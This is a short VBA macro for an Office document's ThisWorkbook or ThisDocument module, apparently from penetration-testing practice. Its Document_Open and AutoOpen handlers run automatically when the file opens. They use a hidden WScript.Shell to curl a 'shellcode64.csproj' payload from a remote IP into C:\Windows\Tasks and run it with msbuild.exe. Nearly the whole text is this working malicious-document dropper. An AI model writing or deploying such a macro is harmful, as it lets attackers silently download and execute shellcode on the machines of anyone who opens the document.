' This code should be placed in the "ThisWorkbook" or "ThisDocument" module in Excel or Word

Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub
Sub test()
    RunPowerShellCommand
End Sub
Sub RunPowerShellCommand()
    Dim objShell As Object
    Dim strCommand1 As String
    Dim strCommand2 As String

    ' Define the first part of the PowerShell command (curl command)
    strCommand1 = "curl http://192.168.45.196/shellcode64.csproj -o C:\\Windows\\Tasks\\shellcode64.csproj"
    
    ' Define the second part of the PowerShell command (msbuild command)
    strCommand2 = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\Windows\\Tasks\\shellcode64.csproj"
    
    ' Create a Shell object and run the first command
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run strCommand1, 0, False
    
    ' Run the second command after the first one has started
    objShell.Run strCommand2, 0, False
End Sub
